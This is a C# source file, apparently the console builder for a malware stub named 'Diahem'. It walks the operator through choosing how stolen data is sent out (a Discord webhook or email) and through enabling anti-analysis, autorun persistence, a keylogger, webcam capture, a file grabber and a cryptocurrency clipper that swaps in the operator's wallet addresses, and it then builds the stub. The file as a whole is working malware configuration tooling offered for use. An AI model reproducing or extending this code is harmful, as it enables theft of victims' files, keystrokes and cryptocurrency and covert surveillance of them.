using Builder.Modules;
using Builder.Modules.build;

namespace Builder;

internal class Program
{
    [STAThread]
    private static void Main()
    {
        // Delivery Settings
        Cli.ShowInfo("Choose delivery method:\n  [1] Discord Webhook\n  [2] Email (TempMail / SMTP)\n");
        var deliveryChoice = Cli.GetStringValue("Select delivery method (1 or 2)");
        
        if (deliveryChoice == "2")
        {
            Build.ConfigValues["DeliveryType"] = Crypt.EncryptConfig("email");
            var recipient = Cli.GetStringValue("Recipient email address");
            if (!Email.IsValidEmail(recipient))
            {
                Cli.ShowError("Invalid email address format!");
            }
            Cli.ShowInfo("Testing SMTP connection...\n");
            if (!Email.TestEmail(recipient!))
            {
                Cli.ShowError("Failed to send test email. Check your internet connection or email address!");
            }
            else
            {
                Cli.ShowSuccess("Test email sent successfully!\n");
            }
            Build.ConfigValues["EmailRecipient"] = Crypt.EncryptConfig(recipient!);
            Build.ConfigValues["Webhook"] = Crypt.EncryptConfig("");
        }
        else
        {
            Build.ConfigValues["DeliveryType"] = Crypt.EncryptConfig("discord");
            var token = Cli.GetStringValue("Discord webhook url");
            if (!Discord.WebhookIsValid(token))
                Cli.ShowError("Check the webhook url!");
            else
                Discord.SendMessage(" *Diahem* builder connected successfully!", token);
            Cli.ShowSuccess("Connected successfully!\n");
            Build.ConfigValues["Webhook"] = Crypt.EncryptConfig(token!);
            Build.ConfigValues["EmailRecipient"] = Crypt.EncryptConfig("");
        }
        // Debug mode (write all exceptions to file)
        Build.ConfigValues["Debug"] = Cli.GetBoolValue("Debug all exceptions to file ?");
        // Installation
        Build.ConfigValues["AntiAnalysis"] = Cli.GetBoolValue("Use anti analysis?");
        Build.ConfigValues["Startup"] = Cli.GetBoolValue("Install autorun?");
        Build.ConfigValues["StartDelay"] = Cli.GetBoolValue("Use random start delay?");
        // Modules
        if (Build.ConfigValues["Startup"].Equals("1"))
        {
            Build.ConfigValues["WebcamScreenshot"] = Cli.GetBoolValue("Create webcam screenshots?");
            Build.ConfigValues["Keylogger"] = Cli.GetBoolValue("Install keylogger?");
            Build.ConfigValues["Clipper"] = Cli.GetBoolValue("Install clipper?");
        }

        Build.ConfigValues["Grabber"] = Cli.GetBoolValue("File Grabber ?");

        // Clipper addresses
        if (Build.ConfigValues["Clipper"].Equals("1"))
        {
            Build.ConfigValues["ClipperBTC"] = Cli.GetEncryptedString("Clipper : Your bitcoin address");
            Build.ConfigValues["ClipperETH"] = Cli.GetEncryptedString("Clipper : Your etherium address");
            Build.ConfigValues["ClipperLTC"] = Cli.GetEncryptedString("Clipper : Your litecoin address");
        }

        // Build
        var build = Build.BuildStub();

        // Done
        Cli.ShowSuccess("Stub: " + build + " saved.");
        Console.ReadLine();
    }
}